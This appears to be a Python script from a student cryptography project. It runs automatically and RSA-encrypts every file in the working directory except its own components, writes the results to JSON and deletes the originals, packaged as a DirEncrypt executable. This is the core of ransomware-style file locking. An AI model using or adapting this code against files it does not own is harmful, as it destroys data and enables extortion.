# -*- coding: utf-8 -*-
"""
Created on Wed Nov 29 14:06:24 2017

@author: phala
"""
import os
import KeyManager
import JSONManager
import FileEncryptMAC

def encryptDir(public_key_path = './'):
    print('encryptDir\'s public_key_path = ' + public_key_path)
    KeyManager.findKeys()
    dir_list = os.listdir()
    if 'JSONManager.py' in dir_list:
        dir_list.remove('JSONManager.py')
    if 'KeyManager.py' in dir_list:
        dir_list.remove('KeyManager.py')
    if 'Mycrypto.py' in dir_list:
        dir_list.remove('Mycrypto.py')
    if 'keys' in dir_list:
        dir_list.remove('keys')
    if 'FileEncryptMAC.py' in dir_list:
        dir_list.remove('FileEncryptMAC.py')
    if 'mycryptographer.py' in dir_list:
        dir_list.remove('mycryptographer.py')
    if '__pycache__' in dir_list:
        dir_list.remove('__pycache__')
    if 'build' in dir_list:
        dir_list.remove('build')
    if 'dist' in dir_list:
        dir_list.remove('dist')
    if 'DirDecrypt.py' in dir_list:
        dir_list.remove('DirDecrypt.py')
    if 'DirEncrypt.py' in dir_list:
        dir_list.remove('DirEncrypt.py')
    if 'DirDecrypt.spec' in dir_list:
        dir_list.remove('DirDecrypt.spec')
    if 'DirEncrypt.spec' in dir_list:
        dir_list.remove('DirEncrypt.spec')
    if 'DirEncrypt.exe' in dir_list:
        dir_list.remove('DirEncrypt.exe')
    if 'DirDecrypt.exe' in dir_list:
        dir_list.remove('DirDecrypt.exe')
    
    for file_name in dir_list:
        print("file_name: " + file_name)
        RSACipher, C, IV, tag, ext = FileEncryptMAC.MyRSAEncrypt(file_name, public_key_path)        
        JSONManager.createJSON(RSACipher, C, IV, tag, ext, file_name)
        os.remove(file_name)
        


#starting point for directory encryption 
encryptDir()